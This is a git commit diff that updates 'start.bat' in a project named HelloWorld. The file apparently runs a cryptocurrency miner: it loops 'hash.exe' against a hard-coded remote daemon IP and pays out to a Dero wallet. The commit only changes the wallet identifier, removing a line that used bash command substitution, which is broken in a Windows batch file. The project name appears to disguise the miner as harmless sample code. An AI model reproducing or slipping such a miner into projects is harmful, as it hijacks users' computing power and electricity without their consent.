cbae56edfcfda6d61c7c7559d6b3791b6bfa09be
dugocal <dugocal@wosaj.com>
2024-05-30 20:42:34 +0700

    Update start.bat

--- HelloWorld/start.bat
+++ HelloWorld/start.bat
@@ -1,6 +1,6 @@
 @echo off
 set /p "daemon=45.86.230.214:80"
-set /p "wallet=dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj.$(echo $(shuf -i 1-9999 -n 1)-WIN)"
+set /p "wallet=dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj.WIN"
 :loop
 hash.exe -d %daemon% -w %wallet%
 timeout 3
